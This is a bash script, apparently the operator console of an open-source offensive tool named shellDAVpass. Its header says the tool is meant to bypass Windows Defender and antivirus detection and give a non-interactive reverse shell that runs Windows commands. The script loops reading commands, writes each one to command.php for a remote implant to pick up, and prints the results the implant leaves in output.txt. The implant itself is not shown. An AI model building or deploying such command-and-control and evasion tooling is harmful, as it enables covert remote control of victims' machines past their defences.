#!/bin/bash

############################################################################
# shellDAVpass application is the Open-Source project, the main idea of    #
# which is to bypass the defender and AntiVirus detections to conduct a    #
# non interactive reverse shell to execute the Windows commands		   #
############################################################################
# Author:   Ivan Glinkin                                                   #
# Contact:  mail@ivanglinkin.com                                           #
# Twitter:  https://twitter.com/glinkinivan                                #
# LinkedIn: https://www.linkedin.com/in/ivanglinkin/                       #
############################################################################

# Variables
version="0.001";
releasedate="June 22, 2022";
sleeptime=7;

# Colors
RED=`echo -n '\e[00;31m'`;
RED_BOLD=`echo -n '\e[01;31m'`;
GREEN=`echo -n '\e[00;32m'`;
GREEN_BOLD=`echo -n '\e[01;32m'`;
ORANGE=`echo -n '\e[00;33m'`;
BLUE=`echo -n '\e[01;36m'`;
WHITE=`echo -n '\e[00;37m'`;
CLEAR_FONT=`echo -n '\e[00m'`;

## Header
echo -e "";
echo -e "$ORANGE╔═══════════════════════════════════════════════════════════════════════════╗$CLEAR_FONT";
echo -e "$ORANGE║\t\t\t\t\t\t\t\t\t    ║$CLEAR_FONT";
echo -e "$ORANGE║$CLEAR_FONT$GREEN_BOLD\t\t\t\t shellDAVpass\t\t\t\t    $CLEAR_FONT$ORANGE║$CLEAR_FONT";
echo -e "$ORANGE║\t\t\t\t\t\t\t\t\t    ║\e[00m";
echo -e "$ORANGE╚═══════════════════════════════════════════════════════════════════════════╝$CLEAR_FONT";
echo -e "";
echo -e "$ORANGE[ ! ] https://www.linkedin.com/in/IvanGlinkin/ | @glinkinivan$CLEAR_FONT";
echo -e "";

while [ "$command" != "exit" ]
do
	read -r -p "[ ! ] Enter your command: " command;
	
	if [[ "$command" == "exit" ]] 
	then echo -e "$ORANGE""[ ! ] Goodbuy :) See you soon ...$CLEAR_FONT";
		exit 
	elif [ -z "$command" ]
	then echo -e "$RED""[ ! ] You didn't enter the command. Try once again$CLEAR_FONT\n";
		continue;
	fi;
	
	echo -e "$BLUE[ * ]$CLEAR_FONT Your command: $GREEN_BOLD$command $CLEAR_FONT- waiting for a response...";
	echo $command > command.php;

	endTime=$(( $(date +%s) + sleeptime ));
	
	echo -e "$BLUE""[ * * ] There response is:$CLEAR_FONT";
	
	while [ -z "$output" ] 
	do
		output=$(tr -d '\0' < output.txt)
		if [ $(date +%s) -gt $endTime ]
		then echo -e "$RED""[ ! ] There is no response. Try another one$CLEAR_FONT";
		break;
		fi;
	done
	
	cat output.txt;
	echo '' > output.txt;
	echo '' > command.php;
	output='';
	command='';
done